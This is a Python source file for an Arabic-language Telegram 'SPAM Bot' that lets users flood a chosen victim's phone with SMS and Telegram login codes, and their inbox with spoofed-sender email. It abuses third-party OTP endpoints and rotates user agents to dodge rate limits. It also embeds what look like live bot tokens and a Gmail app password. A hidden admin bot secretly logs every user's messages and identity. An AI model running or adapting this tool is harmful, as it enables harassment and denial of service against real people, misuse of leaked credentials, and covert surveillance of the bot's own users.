import sys
import subprocess
import time
import threading
import requests
import smtplib
import random
import json
import os
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

# --- [Auto-Setup] تثبيت المكاتب تلقائياً ---
def setup_environment():
    try:
        import telebot
    except ImportError:
        print("installing telebot...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI"])
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

setup_environment()

import telebot
from telebot import types

# ==========================================
# ⚙️ إعدادات البوت والآدمن
# ==========================================

# 1. توكن البوت الذي سيستخدمه الناس (Spam Bot)
API_TOKEN = '5531260100:AAGN253OooBiLpv2CCEGAi_RRFC-rPVxgfQ'

# 2. توكن بوت الأدمن (لوحة التحكم الخاصة بك)
ADMIN_TOKEN = '5499505058:AAFKz6ZnE-eLOcBclSUIWMH6Z78mKo23G1M' 

# 3. الآيدي الخاص بك (محمود)
ADMIN_ID = 1431886140 

# تهيئة البوتات
bot = telebot.TeleBot(API_TOKEN)       # بوت المستخدمين
admin_bot = telebot.TeleBot(ADMIN_TOKEN) # بوت الإدارة

# --- إنشاء مجلد السجلات ---
if not os.path.exists("User_Logs"):
    os.makedirs("User_Logs")

# --- متغيرات التحكم ---
active_attacks = {}  
user_states = {}
user_data = {}

# --- User-Agents ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# ==========================================
# 📝 نظام تسجيل البيانات (Logging System)
# ==========================================
def log_user_input(user, text):
    """دالة لحفظ أي رسالة يرسلها المستخدم في ملف خاص به"""
    try:
        filename = f"User_Logs/{user.id}.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = (
            f"⏰ الوقت: {timestamp}\n"
            f"👤 الاسم: {user.first_name}\n"
            f"📝 المدخل: {text}\n"
            f"----------------------------------------\n"
        )
        
        with open(filename, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"❌ خطأ في التسجيل: {e}")

# ==========================================
# 🚨 دالة نظام التبليغ للأدمن (مع جلب اسم البوت تلقائياً)
# ==========================================
def send_log_to_admin(message):
    try:
        user = message.from_user
        full_name = f"{user.first_name} {user.last_name if user.last_name else ''}".strip()
        username = f"@{user.username}" if user.username else "لا يوجد"
        user_id = user.id
        
        # جلب معلومات البوت الحالي تلقائياً
        bot_info = bot.get_me()
        bot_username = f"@{bot_info.username}"
        
        log_msg = (
            f"🔔 **مستخدم جديد بدأ البوت!**\n\n"
            f"👤 الاسم: `{full_name}`\n"
            f"📧 اليوزر: {username}\n"
            f"🆔 الآيدي: `{user_id}`\n"
            f"📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🤖 **البوت المستخدم:**\n"
            f"🏷️ يوزر البوت: {bot_username}\n"
            f"🔑 التوكن: `{API_TOKEN}`"
        )
        
        admin_bot.send_message(ADMIN_ID, log_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"❌ خطأ إشعار الأدمن: {e}")

# ==========================================
# دوال التحديث والهجوم (Dashboard & Engines)
# ==========================================
def update_dashboard(cid, msg_id, tool_name, target, sent, failed, retries, wait_time=None, status="جاري العمل 🟢"):
    wait_line = f"⏳ انتظار تكتيكي: **{wait_time}s**\n" if wait_time is not None else ""
    text = (
        f"🛡️ **SPAM Bot**\n"
        f"ـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n"
        f"🛠️ الأداة: `{tool_name}`\n"
        f"🎯 الهدف: `{target}`\n"
        f"ـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n"
        f"📊 الحالة: {status}\n\n"
        f"✅ تم الإرسال: **{sent}**\n"
        f"❌ الفشل: **{failed}**\n"
        f"🔄 إعادة المحاولة: **{retries}**\n"
        f"{wait_line}"
        f"ـــــــــــــــــــــــــــــــــــــــــــــــــــــ"
    )
    try:
        bot.edit_message_text(chat_id=cid, message_id=msg_id, text=text, parse_mode="Markdown")
    except:
        pass

def run_sms(cid, phone, count, msg_id):
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    payload = json.dumps({"dial": f"2{phone}"}) 
    sent = 0; failed = 0; total_retries = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        current_wait = random.randint(1, 10)
        attempt_success = False
        for retry in range(3):
            try:
                headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': "application/json"}
                resp = requests.post(url, data=payload, headers=headers, timeout=10)
                if resp.status_code == 200: sent += 1; attempt_success = True; break
                elif resp.status_code == 429: total_retries += 1; time.sleep(5)
                else: total_retries += 1
            except: total_retries += 1; time.sleep(1)
        if not attempt_success: failed += 1
        update_dashboard(cid, msg_id, "SMS Bomber", phone, sent, failed, total_retries, wait_time=current_wait)
        time.sleep(current_wait)
    update_dashboard(cid, msg_id, "SMS Bomber", phone, sent, failed, total_retries, status="اكتملت المهمة ✅")

def run_telegram(cid, phone, count, msg_id):
    headers = {'bot_id': '1288099309', 'origin': 'https://t.me', 'lang': 'en'}
    data = {'phone': phone}
    sent = 0; failed = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        try:
            resp = requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en', headers=headers, data=data, timeout=5)
            if resp.status_code == 200 and resp.text == "true": sent += 1
            else: failed += 1
        except: failed += 1
        update_dashboard(cid, msg_id, "Telegram Spammer", phone, sent, failed, 0, wait_time=None)
        time.sleep(5)
    update_dashboard(cid, msg_id, "Telegram Spammer", phone, sent, failed, 0, status="اكتملت المهمة ✅")

def run_email(cid, target, count, msg_id, sender_name, subject_text, body_text):
    smtp_user = "iphone011012013@gmail.com"
    smtp_pass = "qrpf wkub heck bnbi"
    sent = 0; failed = 0
    for i in range(count):
        if not active_attacks.get(cid, True): break
        try:
            msg = MIMEMultipart()
            msg['From'] = formataddr((sender_name, smtp_user))
            msg['To'] = target
            msg['Subject'] = subject_text
            msg.attach(MIMEText(body_text, 'plain', 'utf-8'))
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(smtp_user, smtp_pass.replace(" ", ""))
            server.sendmail(smtp_user, target, msg.as_string())
            server.quit()
            sent += 1
        except: failed += 1
        update_dashboard(cid, msg_id, "Email Bomber", target, sent, failed, 0, wait_time=None)
        time.sleep(0)
    update_dashboard(cid, msg_id, "Email Bomber", target, sent, failed, 0, status="اكتملت المهمة ✅")

# ==========================================
# منطق بوت المستخدم (User Bot Logic)
# ==========================================
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("🚀 Telegram"),
        types.KeyboardButton("📧 Email"),
        types.KeyboardButton("💣 SMS"),
        types.KeyboardButton("🛑 Stop All")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    cid = message.chat.id
    threading.Thread(target=send_log_to_admin, args=(message,)).start()
    log_user_input(message.from_user, "/start")
    user_states[cid] = None
    bot.send_message(cid, "👋 **أهلاً بك!**\nنظام التحكم جاهز.", reply_markup=main_menu(), parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    cid = message.chat.id
    text = message.text.strip()
    log_user_input(message.from_user, text)

    if text == "🛑 Stop All":
        active_attacks[cid] = False
        bot.send_message(cid, "🛑 تم الإيقاف.", reply_markup=main_menu())
        user_states[cid] = None
        return

    elif text == "🚀 Telegram":
        user_states[cid] = 'wait_tg_phone'
        bot.send_message(cid, "📲 أدخل الرقم الدولي (964...):")
    elif text == "💣 SMS":
        user_states[cid] = 'wait_sms_phone'
        bot.send_message(cid, "💣 أدخل الرقم المصري (10xxxx):")
    elif text == "📧 Email":
        user_states[cid] = 'wait_em_target'
        bot.send_message(cid, "📧 **أدخل إيميل الضحية:**")
    else:
        state = user_states.get(cid)
        if state == 'wait_tg_phone':
            user_data[cid] = {'target': text, 'tool': 'Telegram'}
            user_states[cid] = 'wait_count'
            bot.send_message(cid, "🔢 العدد:")
        elif state == 'wait_sms_phone':
            user_data[cid] = {'target': text, 'tool': 'SMS'}
            user_states[cid] = 'wait_count'
            bot.send_message(cid, "🔢 العدد:")
        elif state == 'wait_em_target':
            if "@" not in text: return bot.send_message(cid, "❌ إيميل غير صحيح.")
            user_data[cid] = {'target': text, 'tool': 'Email'}
            user_states[cid] = 'wait_em_sender_name'
            bot.send_message(cid, "👤 **أدخل اسم المرسل:**\n(الاسم الذي سيظهر للضحية)")
        elif state == 'wait_em_sender_name':
            user_data[cid]['sender_name'] = text
            user_states[cid] = 'wait_em_subject'
            bot.send_message(cid, "📝 **أدخل عنوان الرسالة (Subject):**")
        elif state == 'wait_em_subject':
            user_data[cid]['subject'] = text
            user_states[cid] = 'wait_em_body'
            bot.send_message(cid, "📄 **أدخل نص الرسالة (Body):**")
        elif state == 'wait_em_body':
            user_data[cid]['body'] = text
            user_states[cid] = 'wait_count'
            bot.send_message(cid, "🔢 **كم عدد الرسائل؟**")
        elif state == 'wait_count':
            if not text.isdigit(): return bot.send_message(cid, "❌ أرقام فقط.")
            count = int(text)
            tool = user_data[cid]['tool']
            target = user_data[cid]['target']
            msg = bot.send_message(cid, f"🚀 **جاري البدء...**", parse_mode="Markdown")
            active_attacks[cid] = True
            
            if tool == 'Telegram': threading.Thread(target=run_telegram, args=(cid, target, count, msg.message_id)).start()
            elif tool == 'SMS': threading.Thread(target=run_sms, args=(cid, target, count, msg.message_id)).start()
            elif tool == 'Email':
                s_name = user_data[cid]['sender_name']; s_subj = user_data[cid]['subject']; s_body = user_data[cid]['body']
                threading.Thread(target=run_email, args=(cid, target, count, msg.message_id, s_name, s_subj, s_body)).start()
            user_states[cid] = None

# ==========================================
# 👑 4. منطق بوت الإدارة (Admin Bot Logic)
# ==========================================

@admin_bot.message_handler(commands=['start', 'help'])
def admin_start(message):
    if message.from_user.id != ADMIN_ID: return 
    
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    markup.add(types.KeyboardButton("📂 عرض ملفات المستخدمين"))
    
    welcome_text = (
        "👑 **لوحة تحكم الأدمن**\n\n"
        "1️⃣ اضغط **'📂 عرض ملفات المستخدمين'** لرؤية السجلات.\n"
        "2️⃣ أرسل **أي توكن بوت** هنا وسأقوم بجلبه معلوماته لك (User Bot Check)."
    )
    admin_bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@admin_bot.message_handler(func=lambda message: message.text == "📂 عرض ملفات المستخدمين")
def list_logs(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        files = os.listdir("User_Logs")
        if not files: return admin_bot.send_message(message.chat.id, "📭 لا يوجد سجلات.")
        response = "📂 **قائمة المستخدمين:**\n\n" + "\n".join([f"🆔 `{f.replace('.txt', '')}`" for f in files])
        response += "\n\n📥 **لتحميل ملف:** أرسل الآيدي فقط."
        admin_bot.send_message(message.chat.id, response, parse_mode="Markdown")
    except Exception as e:
        admin_bot.send_message(message.chat.id, f"❌ خطأ: {e}")

# 🔥 [الميزة الجديدة] فاحص التوكن (Token Checker)
@admin_bot.message_handler(func=lambda m: ':' in m.text and len(m.text) > 30) 
def check_token_info(message):
    if message.from_user.id != ADMIN_ID: return
    token = message.text.strip()
    
    msg_wait = admin_bot.reply_to(message, "⏳ **جاري فحص التوكن...**")
    
    try:
        # فحص التوكن عبر API تليجرام المباشر
        response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
        data = response.json()
        
        if data.get('ok'):
            bot_user = data['result']['username']
            bot_id = data['result']['id']
            bot_name = data['result']['first_name']
            
            info_text = (
                f"✅ **تم التحقق من التوكن:**\n\n"
                f"🏷️ يوزر البوت: @{bot_user}\n"
                f"👤 الاسم: {bot_name}\n"
                f"🆔 الآيدي: `{bot_id}`"
            )
            admin_bot.edit_message_text(info_text, message.chat.id, msg_wait.message_id)
        else:
            admin_bot.edit_message_text("❌ هذا التوكن غير صحيح أو محظور.", message.chat.id, msg_wait.message_id)
            
    except Exception as e:
        admin_bot.edit_message_text(f"❌ حدث خطأ أثناء الفحص: {e}", message.chat.id, msg_wait.message_id)

# تحميل ملف السجل (إذا كان المدخل أرقام فقط = آيدي)
@admin_bot.message_handler(func=lambda message: message.text.isdigit())
def get_user_log_file(message):
    if message.from_user.id != ADMIN_ID: return
    file_path = f"User_Logs/{message.text.strip()}.txt"
    if os.path.exists(file_path):
        with open(file_path, "rb") as f:
            admin_bot.send_document(message.chat.id, f, caption=f"📄 سجل: `{message.text}`", parse_mode="Markdown")
    else:
        admin_bot.send_message(message.chat.id, "❌ لا يوجد ملف لهذا الآيدي.")

# ==========================================
# تشغيل الخيوط (Threading)
# ==========================================
def start_user_bot():
    print("\033[92m[+] User Bot Started...\033[0m")
    try: bot.infinity_polling()
    except: pass

def start_admin_bot_thread():
    print("\033[93m[+] Admin Bot Started...\033[0m")
    try: admin_bot.infinity_polling()
    except: pass

if __name__ == "__main__":
    t_admin = threading.Thread(target=start_admin_bot_thread)
    t_admin.start()
    start_user_bot()

# لمنع الإغلاق المباشر
try:
    pass
except Exception as e:
    input("Press Enter to exit...")